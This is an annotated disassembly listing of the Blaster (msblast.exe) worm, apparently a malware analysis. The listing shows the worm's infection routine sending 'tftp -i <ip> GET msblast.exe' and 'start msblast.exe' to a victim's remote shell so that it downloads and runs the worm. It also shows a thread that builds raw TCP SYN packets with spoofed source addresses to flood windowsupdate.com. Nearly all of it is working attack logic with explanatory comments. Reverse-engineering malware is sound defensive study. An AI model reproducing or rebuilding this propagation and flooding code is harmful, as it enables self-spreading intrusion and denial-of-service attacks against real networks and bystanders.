.text:00401C30                 jz      loc_401E3B      ; return
.text:00401C36 
.text:00401C36 Start TFTP server thread and send TFTP command
.text:00401C36 
.text:00401C36                 push    10h
.text:00401C38                 push    0
.text:00401C3A                 push    offset cp
.text:00401C3F                 call    memset
.text:00401C44                 mov     [ebp+namelen], 10h
.text:00401C4E                 push    10h
.text:00401C50                 push    0
.text:00401C52                 lea     eax, [ebp+var_1228]
.text:00401C58                 push    eax
.text:00401C59                 call    memset
.text:00401C5E                 lea     eax, [ebp+namelen]
.text:00401C64                 push    eax             ; namelen
.text:00401C65                 lea     eax, [ebp+var_1228]
.text:00401C6B                 push    eax             ; name
.text:00401C6C                 push    [ebp+var_1208]  ; s
.text:00401C72                 call    getsockname
.text:00401C77                 movzx   eax, [ebp+var_1221]
.text:00401C7E                 push    eax
.text:00401C7F                 movzx   eax, [ebp+var_1222]
.text:00401C86                 push    eax
.text:00401C87                 movzx   eax, [ebp+var_1223]
.text:00401C8E                 push    eax
.text:00401C8F                 movzx   eax, [ebp+var_1224]
.text:00401C96                 push    eax
.text:00401C97                 push    offset aD_D_D_D ; "%d.%d.%d.%d"
.text:00401C9C                 push    offset cp
.text:00401CA1                 call    sprintf
.text:00401CA6                 add     esp, 30h
.text:00401CA9                 cmp     ds:s, 0
.text:00401CB0                 jz      short loc_401CBD
.text:00401CB2                 push    ds:s            ; s
.text:00401CB8                 call    closesocket
.text:00401CBD 
.text:00401CBD loc_401CBD:                             ; CODE XREF: infectTarget+387^j
.text:00401CBD                 lea     eax, [ebp+ThreadId]
.text:00401CC3                 push    eax             ; lpThreadId
.text:00401CC4                 push    0               ; dwCreationFlags
.text:00401CC6                 push    0               ; lpParameter
.text:00401CC8                 push    offset TFTPServerThread ; lpStartAddress
.text:00401CCD                 push    0               ; dwStackSize
.text:00401CCF                 push    0               ; lpThreadAttributes
.text:00401CD1                 call    CreateThread
.text:00401CD6                 mov     [ebp+hObject], eax
.text:00401CDC                 push    50h             ; dwMilliseconds
.text:00401CDE                 call    Sleep           ; sleep for 80ms
.text:00401CE3                 push    offset aMsblast_exe ; "msblast.exe"
.text:00401CE8                 push    offset cp
.text:00401CED                 push    offset aTftpISGetS ; "tftp -i %s GET %s
"
.text:00401CF2                 lea     eax, [ebp+var_1204]
.text:00401CF8                 push    eax
.text:00401CF9                 call    sprintf         ; create command string for downloading worm exe via TFTP
.text:00401CFE                 add     esp, 10h
.text:00401D01                 lea     ecx, [ebp+var_1204]
.text:00401D07                 or      eax, 0FFFFFFFFh
.text:00401D0A 
.text:00401D0A loc_401D0A:                             ; CODE XREF: infectTarget+3E6vj
.text:00401D0A                 inc     eax
.text:00401D0B                 cmp     byte ptr [ecx+eax], 0
.text:00401D0F                 jnz     short loc_401D0A
.text:00401D11                 push    0               ; flags
.text:00401D13                 push    eax             ; len
.text:00401D14                 lea     eax, [ebp+var_1204]
.text:00401D1A                 push    eax             ; buf
.text:00401D1B                 push    [ebp+var_1208]  ; s
.text:00401D21                 call    send            ; send "tftp -i &#60;myipaddr&#62; GET msblast.exe &#60;enter&#62;" command
.text:00401D26                 cmp     eax, 1
.text:00401D29                 jl      loc_401DEB
.text:00401D2F                 push    3E8h            ; dwMilliseconds
.text:00401D34                 call    Sleep           ; sleep for 1 second
.text:00401D39                 xor     ebx, ebx
.text:00401D3B                 jmp     short loc_401D48
.text:00401D3D ; ---------------------------------------------------------------------------
.text:00401D3D 
.text:00401D3D loc_401D3D:                             ; CODE XREF: infectTarget+42Bvj
.text:00401D3D                 push    7D0h            ; dwMilliseconds
.text:00401D42                 call    Sleep           ; sleep for 2 seconds
.text:00401D47                 inc     ebx
.text:00401D48 
.text:00401D48 loc_401D48:                             ; CODE XREF: infectTarget+412^j
.text:00401D48                 cmp     ebx, 0Ah
.text:00401D4B                 jge     short loc_401D56
.text:00401D4D                 cmp     dwTFTPInProgress, 0 ; is TFTP transfer finished?
.text:00401D54                 jnz     short loc_401D3D ; loop up to 10 times waiting for TFTP server to finish
.text:00401D56 
.text:00401D56 loc_401D56:                             ; CODE XREF: infectTarget+422^j
.text:00401D56                 push    offset aMsblast_exe ; "msblast.exe"
.text:00401D5B                 push    offset aStartS  ; "start %s
"
.text:00401D60                 lea     eax, [ebp+var_1204]
.text:00401D66                 push    eax
.text:00401D67                 call    sprintf         ; create command string
.text:00401D6C                 add     esp, 0Ch
.text:00401D6F                 lea     ecx, [ebp+var_1204]
.text:00401D75                 or      eax, 0FFFFFFFFh
.text:00401D78 
.text:00401D78 loc_401D78:                             ; CODE XREF: infectTarget+454vj
.text:00401D78                 inc     eax
.text:00401D79                 cmp     byte ptr [ecx+eax], 0
.text:00401D7D                 jnz     short loc_401D78
.text:00401D7F                 push    0               ; flags
.text:00401D81                 push    eax             ; len
.text:00401D82                 lea     eax, [ebp+var_1204]
.text:00401D88                 push    eax             ; buf
.text:00401D89                 push    [ebp+var_1208]  ; s
.text:00401D8F                 call    send            ; send "start msblast.exe &#60;enter&#62;" command
.text:00401D94                 cmp     eax, 1
.text:00401D97                 jl      short loc_401DEB
.text:00401D99                 push    7D0h            ; dwMilliseconds
.text:00401D9E                 call    Sleep           ; sleep two seconds
.text:00401DA3                 push    offset aMsblast_exe ; "msblast.exe"
.text:00401DA8                 push    offset aS_0     ; "%s
"
.text:00401DAD                 lea     eax, [ebp+var_1204]
.text:00401DB3                 push    eax
.text:00401DB4                 call    sprintf         ; create command string
.text:00401DB9                 add     esp, 0Ch
.text:00401DBC                 lea     ecx, [ebp+var_1204]
.text:00401DC2                 or      eax, 0FFFFFFFFh
.text:00401DC5 
.text:00401DC5 loc_401DC5:                             ; CODE XREF: infectTarget+4A1vj
.text:00401DC5                 inc     eax
.text:00401DC6                 cmp     byte ptr [ecx+eax], 0
.text:00401DCA                 jnz     short loc_401DC5
.text:00401DCC                 push    0               ; flags
.text:00401DCE                 push    eax             ; len
.text:00401DCF                 lea     eax, [ebp+var_1204]
.text:00401DD5                 push    eax             ; buf
.text:00401DD6                 push    [ebp+var_1208]  ; s
.text:00401DDC                 call    send            ; now send "msblast.exe &#60;enter&#62;" command
.text:00401DE1                 push    7D0h            ; dwMilliseconds
.text:00401DE6                 call    Sleep           ; sleep for 2 seconds
.text:00401DEB 
.text:00401DEB loc_401DEB:                             ; CODE XREF: infectTarget+400^j
.text:00401DEB                                         ; infectTarget+46E^j
.text:00401DEB                 cmp     [ebp+var_1208], 0
.text:00401DF2                 jz      short loc_401DFF
.text:00401DF4                 push    [ebp+var_1208]  ; s
.text:00401DFA                 call    closesocket
.text:00401DFF 
.text:00401DFF loc_401DFF:                             ; CODE XREF: infectTarget+4C9^j
.text:00401DFF                 cmp     dwTFTPInProgress, 0
.text:00401E06                 jz      short loc_401E27
.text:00401E08                 push    0               ; dwExitCode
.text:00401E0A                 push    [ebp+hObject]   ; hThread
.text:00401E10                 call    TerminateThread ; kill TFTP server thread if it&#39;s not done already
.text:00401E15                 push    ds:s            ; s
.text:00401E1B                 call    closesocket
.text:00401E20                 and     dwTFTPInProgress, 0
.text:00401E27 
.text:00401E27 loc_401E27:                             ; CODE XREF: infectTarget+4DD^j
.text:00401E27                 cmp     [ebp+hObject], 0
.text:00401E2E                 jz      short loc_401E3B ; return
.text:00401E30                 push    [ebp+hObject]   ; hObject
.text:00401E36                 call    CloseHandle     ; close handle to TFTP server thread
.text:00401E3B 
.text:00401E3B loc_401E3B:                             ; CODE XREF: infectTarget+24C^j
.text:00401E3B                                         ; infectTarget+26C^j ...
.text:00401E3B                 pop     edi             ; return
.text:00401E3C                 pop     esi
.text:00401E3D                 pop     ebx
.text:00401E3E                 leave
.text:00401E3F                 retn
.text:00401E3F infectTarget    endp
.text:00401E3F 
.text:00401E40 
.text:00401E40 ; =============== S U B R O U T I N E =======================================
.text:00401E40 
.text:00401E40 
.text:00401E40 computeChecksum proc near               ; CODE XREF: sendTCP80SYN+1AEvp
.text:00401E40                                         ; sendTCP80SYN+1EAvp
.text:00401E40 
.text:00401E40 lpData          = dword ptr  8
.text:00401E40 dwLength        = dword ptr  0Ch
.text:00401E40 
.text:00401E40                 push    ebx
.text:00401E41                 mov     ebx, [esp+lpData]
.text:00401E45                 mov     ecx, [esp+dwLength]
.text:00401E49                 xor     edx, edx
.text:00401E4B                 jmp     short loc_401E5A
.text:00401E4D ; ---------------------------------------------------------------------------
.text:00401E4D 
.text:00401E4D loc_401E4D:                             ; CODE XREF: computeChecksum+1Dvj
.text:00401E4D                 mov     eax, ebx
.text:00401E4F                 add     ebx, 2
.text:00401E52                 movzx   eax, word ptr [eax]
.text:00401E55                 add     edx, eax
.text:00401E57                 sub     ecx, 2
.text:00401E5A 
.text:00401E5A loc_401E5A:                             ; CODE XREF: computeChecksum+B^j
.text:00401E5A                 cmp     ecx, 1
.text:00401E5D                 jg      short loc_401E4D
.text:00401E5F                 or      ecx, ecx
.text:00401E61                 jz      short loc_401E68
.text:00401E63                 movzx   eax, byte ptr [ebx]
.text:00401E66                 add     edx, eax
.text:00401E68 
.text:00401E68 loc_401E68:                             ; CODE XREF: computeChecksum+21^j
.text:00401E68                 mov     ecx, edx
.text:00401E6A                 shr     ecx, 10h
.text:00401E6D                 mov     ebx, edx
.text:00401E6F                 and     ebx, 0FFFFh
.text:00401E75                 mov     edx, ecx
.text:00401E77                 add     edx, ebx
.text:00401E79                 mov     ecx, edx
.text:00401E7B                 shr     ecx, 10h
.text:00401E7E                 add     edx, ecx
.text:00401E80                 mov     eax, edx
.text:00401E82                 not     eax
.text:00401E84                 and     eax, 0FFFFh
.text:00401E89                 pop     ebx
.text:00401E8A                 retn
.text:00401E8A computeChecksum endp
.text:00401E8A 
.text:00401E8B 
.text:00401E8B ; =============== S U B R O U T I N E =======================================
.text:00401E8B 
.text:00401E8B ; Attributes: bp-based frame
.text:00401E8B 
.text:00401E8B ; int __cdecl lookupIPAddr(char *name)
.text:00401E8B lookupIPAddr    proc near               ; CODE XREF: WUSYNFloodThread+13vp
.text:00401E8B                                         ; sendTCP80SYN+7Evp
.text:00401E8B 
.text:00401E8B name            = dword ptr  8
.text:00401E8B 
.text:00401E8B                 push    ebp
.text:00401E8C                 mov     ebp, esp
.text:00401E8E                 push    esi
.text:00401E8F                 push    edi
.text:00401E90                 push    [ebp+name]      ; cp
.text:00401E93                 call    inet_addr
.text:00401E98                 mov     edi, eax
.text:00401E9A                 xor     esi, esi
.text:00401E9C                 cmp     edi, 0FFFFFFFFh
.text:00401E9F                 jnz     short loc_401EBB
.text:00401EA1                 push    [ebp+name]      ; name
.text:00401EA4                 call    gethostbyname
.text:00401EA9                 mov     esi, eax
.text:00401EAB                 or      esi, esi
.text:00401EAD                 jnz     short loc_401EB4
.text:00401EAF                 or      eax, 0FFFFFFFFh
.text:00401EB2                 jmp     short loc_401EBD
.text:00401EB4 ; ---------------------------------------------------------------------------
.text:00401EB4 
.text:00401EB4 loc_401EB4:                             ; CODE XREF: lookupIPAddr+22^j
.text:00401EB4                 mov     eax, [esi+0Ch]
.text:00401EB7                 mov     eax, [eax]
.text:00401EB9                 mov     edi, [eax]
.text:00401EBB 
.text:00401EBB loc_401EBB:                             ; CODE XREF: lookupIPAddr+14^j
.text:00401EBB                 mov     eax, edi
.text:00401EBD 
.text:00401EBD loc_401EBD:                             ; CODE XREF: lookupIPAddr+27^j
.text:00401EBD                 pop     edi
.text:00401EBE                 pop     esi
.text:00401EBF                 pop     ebp
.text:00401EC0                 retn
.text:00401EC0 lookupIPAddr    endp
.text:00401EC0 
.text:00401EC1 
.text:00401EC1 ; =============== S U B R O U T I N E =======================================
.text:00401EC1 
.text:00401EC1 ; Attributes: bp-based frame
.text:00401EC1 
.text:00401EC1 ; DWORD __stdcall WUSYNFloodThread(LPVOID)
.text:00401EC1 WUSYNFloodThread proc near              ; DATA XREF: WinMain+304^o
.text:00401EC1 
.text:00401EC1 optval          = byte ptr -4
.text:00401EC1 
.text:00401EC1                 push    ebp
.text:00401EC2                 mov     ebp, esp
.text:00401EC4                 push    ecx
.text:00401EC5                 push    ebx
.text:00401EC6                 push    esi
.text:00401EC7                 push    edi             ; s
.text:00401EC8                 mov     dword ptr [ebp+optval], 1
.text:00401ECF                 push    offset aWindowsupdate_ ; name
.text:00401ED4                 call    lookupIPAddr    ; get IP address of "windowsupdate.com"
.text:00401ED9                 pop     ecx
.text:00401EDA                 mov     esi, eax
.text:00401EDC                 push    1               ; dwFlags
.text:00401EDE                 push    0               ; g
.text:00401EE0                 push    0               ; lpProtocolInfo
.text:00401EE2                 push    0FFh            ; protocol
.text:00401EE7                 push    3               ; type
.text:00401EE9                 push    2               ; af
.text:00401EEB                 call    WSASocketA      ; create raw IP socket
.text:00401EF0                 mov     edi, eax
.text:00401EF2                 cmp     eax, 0FFFFFFFFh
.text:00401EF5                 jnz     short loc_401EFB
.text:00401EF7                 xor     eax, eax
.text:00401EF9                 jmp     short loc_401F2F ; return 0
.text:00401EFB ; ---------------------------------------------------------------------------
.text:00401EFB 
.text:00401EFB loc_401EFB:                             ; CODE XREF: WUSYNFloodThread+34^j
.text:00401EFB                 push    4               ; optlen
.text:00401EFD                 lea     eax, [ebp+optval]
.text:00401F00                 push    eax             ; optval
.text:00401F01                 push    2               ; optname
.text:00401F03                 push    0               ; level
.text:00401F05                 push    edi             ; s
.text:00401F06                 call    setsockopt
.text:00401F0B                 cmp     eax, 0FFFFFFFFh
.text:00401F0E                 jnz     short loc_401F14 ; raw IP socket to use
.text:00401F10                 xor     eax, eax
.text:00401F12                 jmp     short loc_401F2F
.text:00401F14 ; ---------------------------------------------------------------------------
.text:00401F14 
.text:00401F14 loc_401F14:                             ; CODE XREF: WUSYNFloodThread+4D^j
.text:00401F14                                         ; WUSYNFloodThread+64vj
.text:00401F14                 push    edi             ; raw IP socket to use
.text:00401F15                 push    esi             ; destination IP address (windowsupdate.com)
.text:00401F16                 call    sendTCP80SYN
.text:00401F1B                 add     esp, 8
.text:00401F1E                 push    14h             ; dwMilliseconds
.text:00401F20                 call    Sleep           ; sleep for 20ms between SYN packets
.text:00401F25                 jmp     short loc_401F14 ; raw IP socket to use
.text:00401F27 ; ---------------------------------------------------------------------------
.text:00401F27                 push    edi
.text:00401F28                 call    closesocket
.text:00401F2D                 xor     eax, eax
.text:00401F2F 
.text:00401F2F loc_401F2F:                             ; CODE XREF: WUSYNFloodThread+38^j
.text:00401F2F                                         ; WUSYNFloodThread+51^j
.text:00401F2F                 pop     edi
.text:00401F30                 pop     esi
.text:00401F31                 pop     ebx
.text:00401F32                 leave
.text:00401F33                 retn    4
.text:00401F33 WUSYNFloodThread endp
.text:00401F33 
.text:00401F36 IPv4 header:
.text:00401F36 
.text:00401F36   -14  BYTE   version &#47; header len
.text:00401F36   -13  BYTE   type of service
.text:00401F36   -12  WORD   total length
.text:00401F36   -10  WORD   identification
.text:00401F36   -0E  BYTE   flags
.text:00401F36   -0D  BYTE   frag offset
.text:00401F36   -0C  BYTE   time-to-live
.text:00401F36   -0B  BYTE   protocol
.text:00401F36   -0A  WORD   checksum
.text:00401F36   -08  DWORD  source IP address
.text:00401F36   -04  DWORD  dest IP address
.text:00401F36 
.text:00401F36 TCP header:
.text:00401F36 
.text:00401F36   -28  WORD   source port
.text:00401F36   -26  WORD   dest port
.text:00401F36   -24  DWORD  sequence number
.text:00401F36   -20  DWORD  ack number
.text:00401F36   -1C  BYTE   header length
.text:00401F36   -1B  BYTE   flags
.text:00401F36   -1A  WORD   window size
.text:00401F36   -18  WORD   checksum
.text:00401F36   -16  WORD   urgent pointer
.text:00401F36 
.text:00401F36 IP "pseudoheader" for computing TCP checksum (RFC 793):
.text:00401F36 
.text:00401F36   -70  DWORD  source IP address
.text:00401F36   -6C  DWORD  dest IP address
.text:00401F36   -68  BYTE   0
.text:00401F36   -67  BYTE   protocol (6: TCP)
.text:00401F36   -66  WORD   TCP header length
.text:00401F36 
.text:00401F36 ; =============== S U B R O U T I N E =======================================
.text:00401F36 
.text:00401F36 ; Attributes: bp-based frame
.text:00401F36 
.text:00401F36 sendTCP80SYN    proc near               ; CODE XREF: WUSYNFloodThread+55^p
.text:00401F36 
.text:00401F36 temprand2       = dword ptr -9Ch
.text:00401F36 temprand1       = dword ptr -98h
.text:00401F36 name            = byte ptr -92h
.text:00401F36 destport        = word ptr -82h
.text:00401F36 to              = sockaddr ptr -80h
.text:00401F36 pseudoheader    = byte ptr -70h
.text:00401F36 buf             = byte ptr -64h
.text:00401F36 tcpheader       = byte ptr -28h
.text:00401F36 ipv4header      = byte ptr -14h
.text:00401F36 dwDestIP        = dword ptr  8
.text:00401F36 s               = dword ptr  0Ch
.text:00401F36 
.text:00401F36                 push    ebp
.text:00401F37                 mov     ebp, esp
.text:00401F39                 sub     esp, 9Ch
.text:00401F3F                 push    ebx
.text:00401F40                 push    esi
.text:00401F41                 push    edi
.text:00401F42 
.text:00401F42 Initialization
.text:00401F42 
.text:00401F42                 lea     edi, [ebp+buf]
.text:00401F45                 lea     esi, ds:4047B0h ; g_zerobuf60[]
.text:00401F4B                 mov     ecx, 0Fh
.text:00401F50                 rep movsd               ; copy 60 byte buffer of zeroes into buf
.text:00401F52                 mov     [ebp+destport], 50h ; destination port (80)
.text:00401F5B                 call    GetTickCount
.text:00401F60                 push    eax
.text:00401F61                 call    srand           ; seed random number generator with GetTickCount()
.text:00401F66 
.text:00401F66   Create random source address for spoofing
.text:00401F66 
.text:00401F66                 call    rand
.text:00401F6B                 mov     [ebp+temprand1], eax
.text:00401F71                 call    rand
.text:00401F76                 mov     ecx, 0FFh
.text:00401F7B                 cdq
.text:00401F7C                 idiv    ecx
.text:00401F7E                 push    edx             ; fourth octet (random 0..254)
.text:00401F7F                 mov     edi, [ebp+temprand1]
.text:00401F85                 mov     eax, edi
.text:00401F87                 mov     ecx, 0FFh
.text:00401F8C                 cdq
.text:00401F8D                 idiv    ecx
.text:00401F8F                 push    edx             ; third octet (random 0..254)
.text:00401F90                 push    ds:synspoofoctet2
.text:00401F96                 push    ds:synspoofoctet1
.text:00401F9C                 push    offset aI_I_I_I ; "%i.%i.%i.%i"
.text:00401FA1                 lea     edi, [ebp+name]
.text:00401FA7                 push    edi
.text:00401FA8                 call    sprintf
.text:00401FAD                 lea     eax, [ebp+name]
.text:00401FB3                 push    eax             ; name
.text:00401FB4                 call    lookupIPAddr
.text:00401FB9                 mov     ebx, eax        ; save source address to spoof in EBX
.text:00401FBB 
.text:00401FBB   Fill in target address (sockaddr) struct
.text:00401FBB 
.text:00401FBB                 mov     [ebp+to.sa_family], 2 ; AF_INET
.text:00401FC1                 movzx   eax, [ebp+destport]
.text:00401FC8                 push    eax             ; hostshort
.text:00401FC9                 call    htons
.text:00401FCE                 mov     edi, eax
.text:00401FD0                 mov     word ptr [ebp+to.sa_data], di ; destination port (80)
.text:00401FD4                 mov     eax, [ebp+dwDestIP]
.text:00401FD7                 mov     dword ptr [ebp+to.sa_data+2], eax
.text:00401FDA 
.text:00401FDA Construct IPv4 header
.text:00401FDA 
.text:00401FDA                 mov     [ebp+ipv4header], 45h ; first byte of raw IP packet:
.text:00401FDA                                         ; IPv4 &#47; 20-byte header
.text:00401FDE                 push    28h             ; hostshort
.text:00401FE0                 call    htons
.text:00401FE5                 mov     edi, eax
.text:00401FE7                 mov     word ptr [ebp+ipv4header+2], di ; total length = 40 bytes
.text:00401FEB                 mov     word ptr [ebp+ipv4header+4], 1
.text:00401FF1                 mov     word ptr [ebp+ipv4header+6], 0 ; flags = 0
.text:00401FF7                 mov     [ebp+ipv4header+8], 80h ; TTL = 128
.text:00401FFB                 mov     [ebp+ipv4header+9], 6 ; protocol = TCP (6)
.text:00401FFF                 mov     word ptr [ebp+ipv4header+0Ah], 0 ; IP checksum
.text:00402005                 mov     eax, [ebp+dwDestIP]
.text:00402008                 mov     dword ptr [ebp+ipv4header+10h], eax ; destination IP (Windows Update)
.text:0040200B 
.text:0040200B Begin constructing TCP header
.text:0040200B 
.text:0040200B                 movzx   eax, [ebp+destport]
.text:00402012                 push    eax             ; hostshort
.text:00402013                 call    htons
.text:00402018                 mov     edi, eax
.text:0040201A                 mov     word ptr [ebp+tcpheader+2], di ; destination port (80)
.text:0040201E                 and     dword ptr [ebp+tcpheader+8], 0 ; zero out ack number
.text:00402022                 mov     [ebp+tcpheader+0Ch], 50h ; header length (50h --&#62; 20 bytes)
.text:00402026                 mov     [ebp+tcpheader+0Dh], 2 ; flags: 2 = SYN
.text:0040202A                 push    4000h           ; hostshort
.text:0040202F                 call    htons
.text:00402034                 mov     edi, eax
.text:00402036                 mov     word ptr [ebp+tcpheader+0Eh], di ; window size: 16384
.text:0040203A                 mov     word ptr [ebp+tcpheader+12h], 0 ; urgent ptr
.text:00402040                 mov     word ptr [ebp+tcpheader+10h], 0 ; TCP checksum
.text:00402046                 mov     eax, dword ptr [ebp+ipv4header+10h]
.text:00402049 
.text:00402049 Construct IP pseudoheader
.text:00402049 
.text:00402049                 mov     dword ptr [ebp+pseudoheader+4], eax ; destination IP (windowsupdate.com)
.text:0040204C                 mov     [ebp+pseudoheader+8], 0 ; store 0 in pseudoheader
.text:00402050                 mov     [ebp+pseudoheader+9], 6 ; store protocol (6: TCP) in pseudoheader
.text:00402054                 push    14h             ; hostshort
.text:00402056                 call    htons
.text:0040205B                 mov     edi, eax
.text:0040205D                 mov     word ptr [ebp+pseudoheader+0Ah], di ; store TCP header size (20) in pseudoheader
.text:00402061 
.text:00402061 Finish filling in IPv4 and TCP headers
.text:00402061 
.text:00402061                 mov     dword ptr [ebp+ipv4header+0Ch], ebx ; source address
.text:00402064                 call    rand
.text:00402069                 mov     ecx, 3E8h
.text:0040206E                 cdq
.text:0040206F                 idiv    ecx
.text:00402071                 mov     edi, edx
.text:00402073                 add     edi, 3E8h
.text:00402079                 and     edi, 0FFFFh     ; (rand() % 1000) + 1000
.text:0040207F                 push    edi             ; hostshort
.text:00402080                 call    htons
.text:00402085                 mov     edi, eax
.text:00402087                 mov     word ptr [ebp+tcpheader], di ; first bytes of TCP header:
.text:00402087                                         ; source port = random 1000..1999
.text:0040208B                 call    rand
.text:00402090                 mov     [ebp+temprand2], eax
.text:00402096                 call    rand
.text:0040209B                 mov     edi, [ebp+temprand2]
.text:004020A1                 shl     edi, 10h
.text:004020A4                 or      edi, eax
.text:004020A6                 and     edi, 0FFFFh
.text:004020AC                 push    edi             ; hostshort
.text:004020AD                 call    htons           ; htons( ((rand() &#60;&#60; 16) | rand()) &#38; 0xFFFF )
.text:004020B2                 mov     edi, eax
.text:004020B4                 and     edi, 0FFFFh
.text:004020BA                 mov     dword ptr [ebp+tcpheader+4], edi ; sequence number
.text:004020BD                 mov     dword ptr [ebp+pseudoheader], ebx ; source address
.text:004020C0 
.text:004020C0 Calculate and store IPv4 and TCP checksums
.text:004020C0 
.text:004020C0                 push    0Ch
.text:004020C2                 lea     eax, [ebp+pseudoheader]
.text:004020C5                 push    eax
.text:004020C6                 lea     eax, [ebp+buf]
.text:004020C9                 push    eax
.text:004020CA                 call    memcpy          ; copy IP pseudoheader into buf[]
.text:004020CF                 push    14h
.text:004020D1                 lea     eax, [ebp+tcpheader]
.text:004020D4                 push    eax
.text:004020D5                 lea     eax, [ebp+buf+0Ch] ; &#38;(buf[0x0C])
.text:004020D8                 push    eax
.text:004020D9                 call    memcpy          ; copy TCP header after pseudoheader into buf[]
.text:004020DE                 push    20h             ; dwLength
.text:004020E0                 lea     eax, [ebp+buf]
.text:004020E3                 push    eax             ; lpData
.text:004020E4                 call    computeChecksum ; compute checksum of (IP pseudoheader + TCP header)
.text:004020E9                 mov     edi, eax
.text:004020EB                 mov     word ptr [ebp+tcpheader+10h], di ; store TCP checksum in TCP header
.text:004020EF                 push    14h
.text:004020F1                 lea     eax, [ebp+ipv4header]
.text:004020F4                 push    eax
.text:004020F5                 lea     eax, [ebp+buf]
.text:004020F8                 push    eax
.text:004020F9                 call    memcpy          ; now copy IPv4 header into buf[]
.text:004020FE                 push    14h
.text:00402100                 lea     eax, [ebp+tcpheader]
.text:00402103                 push    eax
.text:00402104                 lea     eax, [ebp+buf+14h] ; &#38;(buf[0x14])
.text:00402107                 push    eax
.text:00402108                 call    memcpy          ; copy TCP header after IPv4 header in buf[]
.text:0040210D                 push    4
.text:0040210F                 push    0
.text:00402111                 lea     eax, [ebp+buf+28h]
.text:00402114                 push    eax
.text:00402115                 call    memset
.text:0040211A                 push    28h             ; dwLength: 28h (40)
.text:0040211C                 lea     eax, [ebp+buf]
.text:0040211F                 push    eax             ; lpData: buf
.text:00402120                 call    computeChecksum
.text:00402125                 mov     edi, eax
.text:00402127                 mov     word ptr [ebp+ipv4header+0Ah], di ; store IPv4 checksum in IPv4 header
.text:0040212B 
.text:0040212B Send TCP SYN packet to destination IP address
.text:0040212B 
.text:0040212B                 push    14h
.text:0040212D                 lea     eax, [ebp+ipv4header]
.text:00402130                 push    eax
.text:00402131                 lea     eax, [ebp+buf]
.text:00402134                 push    eax
.text:00402135                 call    memcpy          ; copy IPv4 header to buffer
.text:0040213A                 add     esp, 78h
.text:0040213D                 push    10h             ; tolen
.text:0040213F                 lea     eax, [ebp+to]
.text:00402142                 push    eax             ; to
.text:00402143                 push    0               ; flags
.text:00402145                 push    28h             ; len = 40 bytes
.text:00402147                 lea     eax, [ebp+buf]
.text:0040214A                 push    eax             ; buf
.text:0040214B                 push    [ebp+s]         ; s
.text:0040214E                 call    sendto          ; -- send 40-byte raw IP packet
.text:00402153                 pop     edi
.text:00402154                 pop     esi
.text:00402155                 pop     ebx
.text:00402156                 leave
.text:00402157                 retn
.text:00402157 sendTCP80SYN    endp
.text:00402157 
.text:00402158 ; [00000006 BYTES: COLLAPSED FUNCTION htons. PRESS KEYPAD "+" TO EXPAND]
.text:0040215E                 dd 9090h
.text:00402162                 align 4
.text:00402164 ; [00000006 BYTES: COLLAPSED FUNCTION ioctlsocket. PRESS KEYPAD "+" TO EXPAND]
.text:0040216A                 align 8
.text:00402170 ; [00000006 BYTES: COLLAPSED FUNCTION inet_addr. PRESS KEYPAD "+" TO EXPAND]
.text:00402176                 dd 9090h
.text:0040217A                 align 4
.text:0040217C ; [00000006 BYTES: COLLAPSED FUNCTION inet_ntoa. PRESS KEYPAD "+" TO EXPAND]
.text:00402182                 align 8
.text:00402188 ; [00000006 BYTES: COLLAPSED FUNCTION recvfrom. PRESS KEYPAD "+" TO EXPAND]
.text:0040218E                 dd 9090h
.text:00402192                 align 4
.text:00402194 ; [00000006 BYTES: COLLAPSED FUNCTION select. PRESS KEYPAD "+" TO EXPAND]
.text:0040219A                 align 8
.text:004021A0 ; [00000006 BYTES: COLLAPSED FUNCTION send. PRESS KEYPAD "+" TO EXPAND]
.text:004021A6                 dd 9090h
.text:004021AA                 align 4
.text:004021AC ; [00000006 BYTES: COLLAPSED FUNCTION sendto. PRESS KEYPAD "+" TO EXPAND]
.text:004021B2                 align 8
.text:004021B8 ; [00000006 BYTES: COLLAPSED FUNCTION setsockopt. PRESS KEYPAD "+" TO EXPAND]
.text:004021BE                 dd 9090h
.text:004021C2                 align 4
.text:004021C4 ; [00000006 BYTES: COLLAPSED FUNCTION socket. PRESS KEYPAD "+" TO EXPAND]
.text:004021CA                 align 8
.text:004021D0 ; [00000006 BYTES: COLLAPSED FUNCTION gethostbyname. PRESS KEYPAD "+" TO EXPAND]
.text:004021D6                 dd 9090h
.text:004021DA                 align 4
.text:004021DC ; [00000006 BYTES: COLLAPSED FUNCTION bind. PRESS KEYPAD "+" TO EXPAND]
.text:004021E2                 align 8
.text:004021E8 ; [00000006 BYTES: COLLAPSED FUNCTION gethostname. PRESS KEYPAD "+" TO EXPAND]
.text:004021EE                 dd 9090h
.text:004021F2                 align 4
.text:004021F4 ; [00000006 BYTES: COLLAPSED FUNCTION closesocket. PRESS KEYPAD "+" TO EXPAND]
.text:004021FA                 align 8
.text:00402200 ; [00000006 BYTES: COLLAPSED FUNCTION WSAStartup. PRESS KEYPAD "+" TO EXPAND]
.text:00402206                 dd 9090h
.text:0040220A                 align 4
.text:0040220C ; [00000006 BYTES: COLLAPSED FUNCTION WSACleanup. PRESS KEYPAD "+" TO EXPAND]
.text:00402212                 align 8
.text:00402218 ; [00000006 BYTES: COLLAPSED FUNCTION connect. PRESS KEYPAD "+" TO EXPAND]
.text:0040221E                 dd 9090h
.text:00402222                 align 4
.text:00402224 ; [00000006 BYTES: COLLAPSED FUNCTION getpeername. PRESS KEYPAD "+" TO EXPAND]
.text:0040222A                 align 8
.text:00402230 ; [00000006 BYTES: COLLAPSED FUNCTION getsockname. PRESS KEYPAD "+" TO EXPAND]
.text:00402236                 dd 9090h
.text:0040223A                 align 4
.text:0040223C ; [00000006 BYTES: COLLAPSED FUNCTION WSASocketA. PRESS KEYPAD "+" TO EXPAND]
.text:00402242                 align 8
.text:00402248 ; [00000006 BYTES: COLLAPSED FUNCTION InternetGetConnectedState. PRESS KEYPAD "+" TO EXPAND]
.text:0040224E                 dd 9090h
.text:00402252                 align 4
.text:00402254 
.text:00402254 ; =============== S U B R O U T I N E =======================================
.text:00402254 
.text:00402254 ; Attributes: bp-based frame
.text:00402254 
.text:00402254 sub_402254      proc near               ; CODE XREF: start+66^p
.text:00402254 
.text:00402254 var_4           = dword ptr -4
.text:00402254 
.text:00402254                 push    ebp
.text:00402255                 mov     ebp, esp
.text:00402257                 push    ecx
.text:00402258                 push    edi
.text:00402259                 call    GetCommandLineA
.text:0040225E                 mov     edi, eax
.text:00402260                 cmp     byte ptr [edi], 22h
.text:00402263                 jnz     short loc_402288
.text:00402265                 push    22h
.text:00402267                 mov     eax, edi
.text:00402269                 inc     eax
.text:0040226A                 push    eax
.text:0040226B                 call    strchr
.text:00402270                 add     esp, 8
.text:00402273                 mov     [ebp+var_4], eax
